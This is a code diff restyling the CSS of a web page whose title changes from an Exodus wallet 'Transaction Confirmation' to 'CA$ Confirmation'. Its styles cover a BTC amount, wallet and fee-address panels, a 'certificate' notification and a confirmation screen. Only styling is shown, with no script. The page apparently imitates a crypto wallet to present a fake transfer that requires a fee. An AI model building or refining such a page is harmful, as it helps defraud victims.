@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exodus - Transaction Confirmation</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CA$ Confirmation</title>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", sans-serif;
     }
 
     html, body {
@@ -18,27 +18,27 @@
     }
 
     body {
-      background: linear-gradient(135deg, #0f172a 0%, #1a1f3a 100%);
+      background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%);
       color: #e2e8f0;
-      line-height: 1.6;
       min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    a {
+      text-decoration: none;
     }
 
     /* ===== WELCOME SCREEN ===== */
     .welcome-screen {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(135deg, #0f172a 0%, #1a1f3a 100%);
+      inset: 0;
+      background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%);
       display: flex;
       align-items: center;
       justify-content: center;
-      z-index: 2000;
-      opacity: 1;
-      pointer-events: auto;
+      z-index: 4000;
       transition: opacity 0.8s ease;
+      opacity: 1;
     }
 
     .welcome-screen.fade-out {
@@ -52,10 +52,44 @@
     }
 
     .welcome-icon {
-      font-size: 80px;
-      margin-bottom: 2rem;
+      font-size: 82px;
+      margin-bottom: 1.5rem;
       animation: slideDown 0.8s ease;
     }
+
+    .welcome-title {
+      font-size: 52px;
+      font-weight: 700;
+      letter-spacing: -1px;
+      margin-bottom: 10px;
+      animation: slideDown 0.8s ease 0.2s both;
+    }
+
+    .welcome-message {
+      font-size: 22px;
+      color: #cbd5e0;
+      margin-bottom: 2rem;
+      animation: slideDown 0.8s ease 0.4s both;
+    }
+
+    .welcome-loader {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      animation: slideDown 0.8s ease 0.6s both;
+    }
+
+    .loader-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #f7931a;
+      animation: bounce 1.4s infinite;
+    }
+
+    .loader-dot:nth-child(1) { animation-delay: 0s; }
+    .loader-dot:nth-child(2) { animation-delay: 0.2s; }
+    .loader-dot:nth-child(3) { animation-delay: 0.4s; }
 
     @keyframes slideDown {
       from {
@@ -68,97 +102,57 @@
       }
     }
 
-    .welcome-title {
-      font-size: 48px;
-      font-weight: 700;
-      margin-bottom: 1rem;
-      animation: slideDown 0.8s ease 0.2s both;
-      letter-spacing: -1px;
-    }
-
-    .welcome-message {
-      font-size: 20px;
-      opacity: 0.8;
-      margin-bottom: 3rem;
-      animation: slideDown 0.8s ease 0.4s both;
-      color: #cbd5e0;
-    }
-
-    .welcome-loader {
-      display: flex;
-      justify-content: center;
-      gap: 8px;
-      animation: slideDown 0.8s ease 0.6s both;
-    }
-
-    .loader-dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      background: #f7931a;
-      animation: bounce 1.4s infinite;
-    }
-
-    .loader-dot:nth-child(1) {
-      animation-delay: 0s;
-    }
-
-    .loader-dot:nth-child(2) {
-      animation-delay: 0.2s;
-    }
-
-    .loader-dot:nth-child(3) {
-      animation-delay: 0.4s;
-    }
-
     @keyframes bounce {
-      0%, 80%, 100% {
-        transform: scale(0.8);
-        opacity: 0.5;
-      }
-      40% {
-        transform: scale(1);
-        opacity: 1;
-      }
+      0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
+      40% { transform: scale(1); opacity: 1; }
     }
 
-    /* ===== NAVIGATION ===== */
+    /* ===== NAVBAR ===== */
     .navbar {
-      background: rgba(15, 23, 42, 0.8);
-      backdrop-filter: blur(10px);
-      border-bottom: 1px solid rgba(248, 113, 113, 0.1);
-      padding: 0 2rem;
-      height: 70px;
+      height: 72px;
       display: flex;
       align-items: center;
       justify-content: space-between;
+      padding: 0 2rem;
+      background: rgba(15, 23, 42, 0.8);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
       position: sticky;
       top: 0;
-      z-index: 100;
+      z-index: 1000;
     }
 
     .navbar-brand {
       display: flex;
       align-items: center;
-      gap: 12px;
-      text-decoration: none;
+      gap: 10px;
       color: #f7931a;
-      font-weight: 700;
       font-size: 24px;
+      font-weight: 700;
       letter-spacing: -0.5px;
     }
 
-    .navbar-right {
+    .navbar-left {
       display: flex;
       align-items: center;
-      gap: 2rem;
+      gap: 20px;
+    }
+
+    .canada-flag {
+      width: 24px;
+      height: 16px;
+      background: linear-gradient(90deg, #ff0000 0%, #ff0000 33%, white 33%, white 66%, #ff0000 66%, #ff0000 100%);
+      border-radius: 2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
     }
 
     .user-profile {
       display: flex;
       align-items: center;
       gap: 12px;
-      cursor: pointer;
     }
 
     .user-avatar {
@@ -169,18 +163,14 @@
       display: flex;
       align-items: center;
       justify-content: center;
+      font-weight: 700;
       color: white;
-      font-weight: 600;
-      font-size: 16px;
-    }
-
-    .user-info {
-      text-align: right;
+      font-size: 14px;
     }
 
     .user-name {
-      font-weight: 600;
       font-size: 14px;
+      font-weight: 600;
       color: #e2e8f0;
     }
 
@@ -191,270 +181,244 @@
 
     /* ===== MAIN CONTAINER ===== */
     .container {
-      max-width: 1000px;
+      max-width: 1020px;
       margin: 0 auto;
-      padding: 3rem 2rem;
+      padding: 3rem 2rem 4rem;
     }
 
-    /* ===== HEADER SECTION ===== */
     .page-header {
-      margin-bottom: 3rem;
       text-align: center;
+      margin-bottom: 2.5rem;
     }
 
     .page-title {
-      font-size: 36px;
+      font-size: 38px;
       font-weight: 700;
-      color: #f1f5f9;
-      margin-bottom: 8px;
       letter-spacing: -1px;
+      color: #f8fafc;
+      margin-bottom: 8px;
     }
 
     .page-subtitle {
-      font-size: 16px;
       color: #94a3b8;
-    }
-
-    /* ===== CARD STYLES ===== */
-    .card {
-      background: rgba(30, 41, 59, 0.6);
-      backdrop-filter: blur(10px);
-      border-radius: 16px;
-      padding: 2.5rem;
-      border: 1px solid rgba(248, 113, 113, 0.1);
-      transition: all 0.4s ease;
-    }
-
-    .card:hover {
-      border-color: rgba(248, 113, 113, 0.2);
-      background: rgba(30, 41, 59, 0.8);
+      font-size: 16px;
     }
 
     /* ===== TRANSACTION CARD ===== */
     .transaction-card {
-      background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(20, 29, 47, 0.8) 100%);
-      border-radius: 20px;
-      padding: 3rem;
-      border: 1px solid rgba(248, 113, 113, 0.15);
-      text-align: center;
+      background: linear-gradient(135deg, rgba(30, 41, 59, 0.85), rgba(20, 29, 47, 0.85));
+      border: 1px solid rgba(247, 147, 26, 0.15);
+      border-radius: 22px;
+      padding: 3rem 2rem;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.22);
       margin-bottom: 2rem;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-      animation: slideUp 0.6s ease;
+      animation: fadeUp 0.6s ease;
+      position: relative;
+      overflow: hidden;
     }
 
-    @keyframes slideUp {
+    .transaction-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.5), transparent);
+    }
+
+    @keyframes fadeUp {
       from {
-        transform: translateY(30px);
         opacity: 0;
+        transform: translateY(30px);
       }
       to {
-        transform: translateY(0);
         opacity: 1;
+        transform: translateY(0);
       }
     }
 
     .transaction-label {
-      font-size: 14px;
       text-transform: uppercase;
-      letter-spacing: 1px;
+      letter-spacing: 1.2px;
       color: #94a3b8;
-      margin-bottom: 1rem;
-      font-weight: 600;
+      font-size: 11px;
+      font-weight: 700;
+      margin-bottom: 12px;
     }
 
     .transaction-type {
-      font-size: 16px;
-      color: #cbd5e0;
-      margin-bottom: 1.5rem;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 12px;
+      font-weight: 600;
+      color: #cbd5e0;
+      margin-bottom: 1.5rem;
+      font-size: 16px;
     }
 
     .transaction-icon {
-      font-size: 28px;
+      font-size: 32px;
+      color: #f7931a;
+    }
+
+    .amount-row {
+      display: flex;
+      align-items: baseline;
+      justify-content: center;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-bottom: 1.5rem;
     }
 
     .transaction-amount {
-      font-size: 56px;
-      font-weight: 700;
-      color: #f1f5f9;
-      margin-bottom: 8px;
-      letter-spacing: -1px;
+      font-size: clamp(48px, 6vw, 68px);
+      font-weight: 800;
+      letter-spacing: -2px;
+      color: #f8fafc;
     }
 
     .transaction-currency {
-      font-size: 20px;
+      font-size: 24px;
       color: #f7931a;
-      font-weight: 600;
+      font-weight: 700;
     }
 
     .transaction-divider {
       height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(248, 113, 113, 0.2), transparent);
-      margin: 2rem 0;
+      background: linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.3), transparent);
+      margin: 1.8rem 0;
     }
 
-    /* ===== DETAILS GRID ===== */
+    .btc-value {
+      color: #f7931a;
+      font-size: 16px;
+      text-align: center;
+      font-weight: 600;
+    }
+
+    /* ===== INFO GRID ===== */
     .details-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 2rem;
-      margin-bottom: 2rem;
+      gap: 1.25rem;
+      margin-bottom: 1.5rem;
     }
 
-    @media (max-width: 768px) {
-      .details-grid {
-        grid-template-columns: 1fr;
-      }
+    .info-box {
+      background: rgba(15, 23, 42, 0.56);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 14px;
+      padding: 1.2rem 1.25rem;
+      transition: all 0.3s ease;
     }
 
-    .detail-item {
-      background: rgba(15, 23, 42, 0.5);
-      border-radius: 12px;
-      padding: 1.5rem;
-      border: 1px solid rgba(248, 113, 113, 0.1);
+    .info-box:hover {
+      border-color: rgba(247, 147, 26, 0.2);
+      background: rgba(15, 23, 42, 0.7);
     }
 
-    .detail-label {
-      font-size: 12px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
+    .info-label {
       color: #94a3b8;
+      text-transform: uppercase;
+      letter-spacing: 0.7px;
+      font-size: 11px;
       margin-bottom: 8px;
-      font-weight: 600;
-    }
-
-    .detail-value {
-      font-size: 16px;
-      color: #e2e8f0;
-      font-weight: 600;
-      word-break: break-all;
-      font-family: 'Courier New', monospace;
-    }
-
-    /* ===== RECIPIENT SECTION ===== */
-    .recipient-section {
-      background: rgba(15, 23, 42, 0.5);
-      border-radius: 12px;
-      padding: 1.5rem;
-      border: 1px solid rgba(248, 113, 113, 0.1);
-      margin-bottom: 1rem;
-    }
-
-    .recipient-label {
-      font-size: 12px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      color: #94a3b8;
-      margin-bottom: 12px;
-      font-weight: 600;
-    }
-
-    .recipient-value {
-      font-size: 14px;
-      color: #e2e8f0;
-      font-family: 'Courier New', monospace;
-      word-break: break-all;
-      background: rgba(30, 41, 59, 0.6);
-      padding: 12px;
-      border-radius: 8px;
-      border: 1px solid rgba(248, 113, 113, 0.1);
-    }
-
-    .fee-section {
-      background: rgba(15, 23, 42, 0.5);
-      border-radius: 12px;
-      padding: 1.5rem;
-      border: 1px solid rgba(248, 113, 113, 0.1);
-      margin-bottom: 2rem;
-    }
-
-    .fee-label {
-      font-size: 12px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      color: #94a3b8;
-      margin-bottom: 8px;
-      font-weight: 600;
-    }
-
-    .fee-amount {
-      font-size: 24px;
-      color: #f7931a;
       font-weight: 700;
-      margin-bottom: 12px;
     }
 
-    .fee-address {
-      font-size: 12px;
-      color: #cbd5e0;
-      font-family: 'Courier New', monospace;
+    .info-value {
+      color: #e2e8f0;
+      font-size: 15px;
+      font-weight: 600;
+      word-break: break-word;
+      font-family: "Courier New", monospace;
+    }
+
+    /* ===== WALLET BLOCK ===== */
+    .wallet-block {
+      background: rgba(15, 23, 42, 0.56);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 14px;
+      padding: 1.2rem 1.25rem;
+      margin-bottom: 1.5rem;
+      transition: all 0.3s ease;
+    }
+
+    .wallet-block:hover {
+      border-color: rgba(247, 147, 26, 0.2);
+      background: rgba(15, 23, 42, 0.7);
+    }
+
+    .wallet-address {
+      color: #e2e8f0;
+      font-size: 13px;
       word-break: break-all;
-      background: rgba(30, 41, 59, 0.6);
+      font-family: "Courier New", monospace;
+      background: rgba(30, 41, 59, 0.7);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: 10px;
       padding: 12px;
-      border-radius: 8px;
-      border: 1px solid rgba(248, 113, 113, 0.1);
+      margin-top: 8px;
+      line-height: 1.6;
     }
 
-    /* ===== BUTTON STYLES ===== */
+    /* ===== BUTTONS ===== */
     .button-group {
       display: flex;
       gap: 1rem;
-      margin-top: 2.5rem;
       flex-wrap: wrap;
+      margin-top: 2rem;
     }
 
     .btn {
-      padding: 14px 28px;
-      border-radius: 10px;
-      border: none;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s ease;
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
       min-height: 48px;
+      padding: 14px 24px;
+      border-radius: 12px;
+      border: none;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 700;
+      transition: all 0.25s ease;
+      text-decoration: none;
     }
 
     .btn-primary {
       background: linear-gradient(135deg, #f7931a 0%, #e08f0f 100%);
       color: white;
-      box-shadow: 0 8px 24px rgba(247, 147, 26, 0.3);
       flex: 1;
-      min-width: 200px;
-      font-weight: 700;
+      min-width: 220px;
+      box-shadow: 0 10px 30px rgba(247, 147, 26, 0.25);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-primary::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: left 0.6s ease;
+    }
+
+    .btn-primary:hover::before {
+      left: 100%;
     }
 
     .btn-primary:hover {
       transform: translateY(-2px);
-      box-shadow: 0 12px 32px rgba(247, 147, 26, 0.4);
-      background: linear-gradient(135deg, #e08f0f, #c97d0a);
+      box-shadow: 0 14px 35px rgba(247, 147, 26, 0.35);
     }
 
     .btn-primary:active {
       transform: translateY(0);
-    }
-
-    .btn-primary:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    .btn-secondary {
-      background: transparent;
-      color: #f7931a;
-      border: 2px solid #f7931a;
-      flex: 1;
-    }
-
-    .btn-secondary:hover {
-      background: rgba(247, 147, 26, 0.1);
     }
 
     .btn-support {
@@ -462,271 +426,13 @@
       color: #f7931a;
       border: 2px solid #f7931a;
       padding: 12px 20px;
-      font-size: 14px;
-      width: auto;
-      text-decoration: none;
-      display: inline-flex;
+      min-width: 180px;
+      transition: all 0.25s ease;
     }
 
     .btn-support:hover {
       background: rgba(247, 147, 26, 0.1);
-      color: #f7931a;
-    }
-
-    /* ===== NOTIFICATION DROPDOWN ===== */
-    .notification-dropdown {
-      position: fixed;
-      top: 70px;
-      right: 2rem;
-      background: rgba(30, 41, 59, 0.95);
-      backdrop-filter: blur(10px);
-      border-radius: 16px;
-      padding: 1.5rem;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
-      border: 1px solid rgba(248, 113, 113, 0.2);
-      max-width: 400px;
-      z-index: 1500;
-      transform: translateY(-400px);
-      opacity: 0;
-      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-      pointer-events: none;
-    }
-
-    .notification-dropdown.show {
-      transform: translateY(0);
-      opacity: 1;
-      pointer-events: auto;
-    }
-
-    .notification-header {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 12px;
-    }
-
-    .notification-icon {
-      font-size: 28px;
-      flex-shrink: 0;
-    }
-
-    .notification-title {
-      font-weight: 700;
-      color: #f7931a;
-      font-size: 16px;
-    }
-
-    .notification-message {
-      font-size: 14px;
-      color: #cbd5e0;
-      line-height: 1.6;
-      margin-bottom: 12px;
-    }
-
-    .notification-certificate {
-      width: 100%;
-      height: 180px;
-      border-radius: 8px;
-      margin-bottom: 12px;
-      object-fit: cover;
-      border: 1px solid rgba(248, 113, 113, 0.1);
-    }
-
-    .notification-amount {
-      background: rgba(247, 147, 26, 0.1);
-      border-left: 3px solid #f7931a;
-      padding: 12px;
-      border-radius: 6px;
-      margin-bottom: 12px;
-      font-weight: 700;
-      color: #f7931a;
-      font-size: 16px;
-    }
-
-    .notification-fee-address {
-      background: rgba(247, 147, 26, 0.1);
-      border-left: 3px solid #f7931a;
-      padding: 12px;
-      border-radius: 6px;
-      font-size: 12px;
-      color: #cbd5e0;
-      font-family: 'Courier New', monospace;
-      word-break: break-all;
-      line-height: 1.4;
-    }
-
-    /* ===== MODAL/DIALOG ===== */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.4s ease;
-      z-index: 1000;
-      padding: 2rem;
-      overflow-y: auto;
-      backdrop-filter: blur(4px);
-    }
-
-    .modal-overlay.show {
-      opacity: 1;
-      pointer-events: auto;
-    }
-
-    .modal-content {
-      background: linear-gradient(135deg, rgba(30, 41, 59, 0.95) 0%, rgba(20, 29, 47, 0.95) 100%);
-      border-radius: 20px;
-      padding: 3rem;
-      max-width: 600px;
-      width: 100%;
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
-      max-height: 90vh;
-      overflow-y: auto;
-      animation: modalSlideUp 0.4s ease;
-      position: relative;
-      border: 1px solid rgba(248, 113, 113, 0.1);
-    }
-
-    @keyframes modalSlideUp {
-      from {
-        transform: translateY(30px);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
-    .modal-header {
-      margin-bottom: 2rem;
-      padding-bottom: 1.5rem;
-      border-bottom: 1px solid rgba(248, 113, 113, 0.1);
-    }
-
-    .modal-title {
-      font-size: 28px;
-      font-weight: 700;
-      color: #f1f5f9;
-      margin-bottom: 8px;
-      letter-spacing: -1px;
-    }
-
-    .modal-subtitle {
-      font-size: 14px;
-      color: #94a3b8;
-    }
-
-    .modal-close {
-      position: absolute;
-      top: 1.5rem;
-      right: 1.5rem;
-      background: rgba(248, 113, 113, 0.1);
-      border: none;
-      width: 36px;
-      height: 36px;
-      border-radius: 50%;
-      cursor: pointer;
-      font-size: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #cbd5e0;
-      transition: all 0.3s ease;
-    }
-
-    .modal-close:hover {
-      background: rgba(248, 113, 113, 0.2);
-      color: #f7931a;
-    }
-
-    /* ===== WALLET DETAILS ===== */
-    .wallet-card {
-      background: rgba(15, 23, 42, 0.5);
-      border: 1px solid rgba(248, 113, 113, 0.1);
-      border-radius: 12px;
-      padding: 1.5rem;
-      margin-bottom: 2rem;
-    }
-
-    .wallet-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      padding: 1rem 0;
-      border-bottom: 1px solid rgba(248, 113, 113, 0.05);
-    }
-
-    .wallet-row:last-child {
-      border-bottom: none;
-    }
-
-    .wallet-label {
-      font-size: 12px;
-      font-weight: 700;
-      color: #94a3b8;
-      text-transform: uppercase;
-      letter-spacing: 0.3px;
-    }
-
-    .wallet-value {
-      font-size: 14px;
-      color: #e2e8f0;
-      font-weight: 600;
-      font-family: 'Courier New', monospace;
-      word-break: break-all;
-      text-align: right;
-      flex: 1;
-      margin-left: 1rem;
-    }
-
-    .wallet-address-display {
-      background: rgba(30, 41, 59, 0.8);
-      border: 1px solid rgba(248, 113, 113, 0.1);
-      border-radius: 8px;
-      padding: 12px;
-      margin-bottom: 1rem;
-      font-family: 'Courier New', monospace;
-      font-size: 12px;
-      color: #f7931a;
-      word-break: break-all;
-      line-height: 1.5;
-    }
-
-    .btn-copy {
-      background: transparent;
-      color: #f7931a;
-      border: 2px solid #f7931a;
-      padding: 10px 16px;
-      font-size: 12px;
-      width: 100%;
-      margin-top: 8px;
-    }
-
-    .btn-copy:hover {
-      background: rgba(247, 147, 26, 0.1);
-    }
-
-    /* ===== LOADING SPINNER ===== */
-    .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 3px solid rgba(247, 147, 26, 0.3);
-      border-radius: 50%;
-      border-top-color: #f7931a;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+      border-color: #f7931a;
     }
 
     .btn-loading {
@@ -746,26 +452,283 @@
       border: 2px solid rgba(255, 255, 255, 0.3);
       border-radius: 50%;
       border-top-color: white;
-      animation: spin 0.8s linear infinite;
+      border-right-color: white;
+      animation: spinSmooth 0.8s linear infinite;
+    }
+
+    @keyframes spinSmooth {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ===== MODAL ===== */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+      z-index: 2000;
+      backdrop-filter: blur(5px);
+    }
+
+    .modal-overlay.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .modal-content {
+      width: min(620px, 100%);
+      background: linear-gradient(180deg, rgba(30, 41, 59, 0.96), rgba(15, 23, 42, 0.96));
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      padding: 2rem 1.5rem 1.5rem;
+      position: relative;
+      box-shadow: 0 25px 80px rgba(0, 0, 0, 0.5);
+      animation: modalIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    @keyframes modalIn {
+      from {
+        transform: translateY(40px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      width: 38px;
+      height: 38px;
+      border: none;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.08);
+      color: #e2e8f0;
+      font-size: 22px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .modal-close:hover {
+      background: rgba(247, 147, 26, 0.2);
+      color: #f7931a;
+    }
+
+    .modal-header {
+      margin-bottom: 1.5rem;
+      padding-right: 42px;
+    }
+
+    .modal-title {
+      font-size: 28px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+      color: #f8fafc;
+      margin-bottom: 5px;
+    }
+
+    .modal-subtitle {
+      font-size: 14px;
+      color: #94a3b8;
+    }
+
+    .wallet-card {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: 14px;
+      padding: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .wallet-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 0.9rem 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    }
+
+    .wallet-row:last-child {
+      border-bottom: none;
+    }
+
+    .wallet-label {
+      color: #94a3b8;
+      text-transform: uppercase;
+      letter-spacing: 0.7px;
+      font-size: 11px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .wallet-value {
+      color: #e2e8f0;
+      font-family: "Courier New", monospace;
+      word-break: break-all;
+      text-align: right;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .warning-box {
+      margin: 1.2rem 0 1.5rem;
+      background: rgba(247, 147, 26, 0.08);
+      border: 1px solid rgba(247, 147, 26, 0.22);
+      color: #f1f5f9;
+      border-radius: 10px;
+      padding: 1rem;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .modal-actions .btn {
+      flex: 1;
+      min-width: 140px;
+    }
+
+    .btn-secondary {
+      background: transparent;
+      border: 2px solid #f7931a;
+      color: #f7931a;
+    }
+
+    .btn-secondary:hover {
+      background: rgba(247, 147, 26, 0.1);
+    }
+
+    /* ===== NOTIFICATION ===== */
+    .notification-dropdown {
+      position: fixed;
+      top: 78px;
+      right: 20px;
+      width: min(420px, calc(100vw - 28px));
+      background: rgba(15, 23, 42, 0.97);
+      border: 1px solid rgba(247, 147, 26, 0.25);
+      border-radius: 16px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
+      padding: 1.2rem;
+      z-index: 3000;
+      opacity: 0;
+      transform: translateY(-420px);
+      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+      pointer-events: none;
+    }
+
+    .notification-dropdown.show {
+      opacity: 1;
+      transform: translateY(0);
+      pointer-events: auto;
+    }
+
+    .notification-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .notification-icon {
+      font-size: 28px;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .notification-title {
+      color: #f7931a;
+      font-weight: 700;
+      font-size: 16px;
+    }
+
+    .notification-message {
+      color: #cbd5e0;
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 12px;
+    }
+
+    .notification-certificate {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      display: block;
+      margin-bottom: 12px;
+      background: #0b1120;
+      animation: imageSlideIn 0.6s ease;
+    }
+
+    @keyframes imageSlideIn {
+      from {
+        opacity: 0;
+        transform: scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    .notification-fee {
+      background: rgba(247, 147, 26, 0.1);
+      border-left: 3px solid #f7931a;
+      border-radius: 10px;
+      padding: 12px;
+      margin-bottom: 10px;
+      color: #f8fafc;
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .notification-address {
+      background: rgba(247, 147, 26, 0.05);
+      border-left: 3px solid #f7931a;
+      border-radius: 10px;
+      padding: 12px;
+      color: #dbeafe;
+      font-family: "Courier New", monospace;
+      font-size: 12px;
+      word-break: break-all;
+      line-height: 1.5;
     }
 
     /* ===== CONFIRMATION PAGE ===== */
     .confirmation-page {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(135deg, #0f172a 0%, #1a1f3a 100%);
+      inset: 0;
+      background: linear-gradient(135deg, #0f172a 0%, #1d2437 100%);
       display: none;
       align-items: center;
       justify-content: center;
-      z-index: 3000;
       flex-direction: column;
-      gap: 2rem;
+      z-index: 5000;
+      text-align: center;
+      gap: 1.5rem;
       padding: 2rem;
       opacity: 0;
       transition: opacity 0.6s ease;
+      overflow-y: auto;
     }
 
     .confirmation-page.show {
@@ -773,72 +736,98 @@
       opacity: 1;
     }
 
-    .confirmation-checkmark {
-      width: 80px;
-      height: 80px;
+    .confirmation-check {
+      width: 90px;
+      height: 90px;
       border-radius: 50%;
       background: linear-gradient(135deg, #f7931a, #e08f0f);
       display: flex;
       align-items: center;
       justify-content: center;
       font-size: 48px;
-      animation: popIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      font-weight: 900;
+      color: white;
+      animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      box-shadow: 0 20px 50px rgba(247, 147, 26, 0.35);
+      flex-shrink: 0;
     }
 
     @keyframes popIn {
       0% {
         transform: scale(0);
+        opacity: 0;
       }
-      50% {
-        transform: scale(1.1);
+      60% {
+        transform: scale(1.15);
       }
       100% {
         transform: scale(1);
+        opacity: 1;
       }
     }
 
     .confirmation-title {
-      font-size: 32px;
-      font-weight: 700;
-      color: #f1f5f9;
-      text-align: center;
+      font-size: 36px;
+      font-weight: 800;
       letter-spacing: -1px;
+      color: #f8fafc;
+      animation: fadeInUp 0.6s ease 0.2s both;
     }
 
     .confirmation-message {
-      font-size: 16px;
       color: #cbd5e0;
-      text-align: center;
-      max-width: 400px;
+      font-size: 16px;
+      animation: fadeInUp 0.6s ease 0.3s both;
     }
 
     .confirmation-amount {
-      font-size: 48px;
-      font-weight: 700;
       color: #f7931a;
-      text-align: center;
-      letter-spacing: -1px;
+      font-size: 56px;
+      font-weight: 800;
+      letter-spacing: -1.5px;
+      animation: fadeInUp 0.6s ease 0.4s both;
+    }
+
+    .confirmation-btc {
+      color: #cbd5e0;
+      font-size: 18px;
+      font-weight: 600;
+      animation: fadeInUp 0.6s ease 0.5s both;
     }
 
     .confirmation-details {
+      max-width: 520px;
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid rgba(247, 147, 26, 0.15);
+      border-radius: 14px;
+      padding: 1.2rem 1.5rem;
+      color: #cbd5e0;
       font-size: 14px;
-      color: #94a3b8;
-      text-align: center;
-      background: rgba(30, 41, 59, 0.6);
-      border: 1px solid rgba(248, 113, 113, 0.1);
-      border-radius: 12px;
-      padding: 1.5rem;
-      max-width: 500px;
+      line-height: 1.8;
+      animation: fadeInUp 0.6s ease 0.6s both;
     }
 
     .confirmation-certificate {
-      width: 100%;
-      max-width: 400px;
-      height: 200px;
-      border-radius: 12px;
